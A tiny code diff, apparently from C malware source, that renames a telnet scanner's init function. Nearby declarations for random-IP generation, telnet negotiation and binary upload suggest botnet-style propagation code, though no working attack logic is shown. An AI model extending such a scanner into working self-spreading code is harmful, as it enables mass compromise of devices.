@@ -64,7 +64,7 @@ static void scanner_send_iac(struct scanner_connection *conn);
 static ipv4_t get_random_ip(void);
 static void scanner_upload_binary(struct scanner_connection *conn);
 
-void scanner_init(void) {
+void telnet_scanner_init(void) {
     memset(conns, 0, sizeof(conns));
     conn_count = 0;
     
